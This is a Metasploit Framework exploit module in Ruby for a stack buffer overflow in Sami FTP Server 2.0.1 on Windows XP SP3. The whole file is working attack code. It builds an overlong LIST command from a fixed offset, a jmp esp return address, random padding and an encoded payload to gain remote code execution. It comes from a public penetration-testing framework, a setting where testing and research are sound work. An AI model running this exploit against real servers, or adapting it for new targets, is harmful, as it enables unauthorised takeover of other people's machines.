##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#  http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit4 < Msf::Exploit::Remote
  Rank = LowRanking

  include Msf::Exploit::Remote::Ftp

  def initialize(info = {})
    super(update_info(info,
      'Name'       => 'Sami FTP Server LIST Command Buffer Overflow',
      'Description'   => %q{
          This module exploits a stack based buffer overflow on Sami FTP Server 2.0.1.
        The vulnerability exists in the processing of LIST commands. In order to trigger
        the vulnerability, the "Log" tab must be viewed in the Sami FTP Server managing
        application, in the target machine. On the other hand, the source IP address used
        to connect with the FTP Server is needed. If the user can't provide it, the module
        will try to resolve it. This module has been tested successfully on Sami FTP Server
        2.0.1 over Windows XP SP3.
      },
      'Platform'     => 'win',
      'Author'     =>
        [
          'superkojiman', # Original exploit
          'Doug Prostko <dougtko[at]gmail.com>' # MSF module
        ],
      'License'     => MSF_LICENSE,
      'References'   =>
        [
          [ 'OSVDB', '90815'],
          [ 'BID', '58247'],
          [ 'EDB', '24557']
        ],
      'Privileged'   => false,
      'Payload'     =>
        {
          'Space'          => 1500,
          'DisableNops'    => true,
          'BadChars'       => "\x00\x0a\x0d\x20\x5c",
          'PrependEncoder' => "\x81\xc4\x54\xf2\xff\xff" # Stack adjustment # add esp, -3500
        },
      'Targets'     =>
        [
          [ 'Sami FTP Server 2.0.1 / Windows XP SP3',
            {
              'Ret' => 0x10028283, # jmp esp from C:\Program Files\PMSystem\Temp\tmp0.dll
              'Offset'   => 228
            }
          ],
        ],
      'DefaultTarget' => 0,
      'DisclosureDate' => 'Feb 27 2013'))
    register_options(
      [
        OptAddress.new('SOURCEIP', [false, 'The local client address'])
      ], self.class)
  end

  def exploit
    connect
    if datastore['SOURCEIP']
      ip_length = datastore['SOURCEIP'].length
    else
      ip_length = Rex::Socket.source_address(rhost).length
    end
    buf = rand_text(target['Offset'] - ip_length)
    buf << [ target['Ret'] ].pack('V')
    buf << rand_text(16)
    buf << payload.encoded
    send_cmd( ['LIST', buf], false )
    disconnect
  end

end
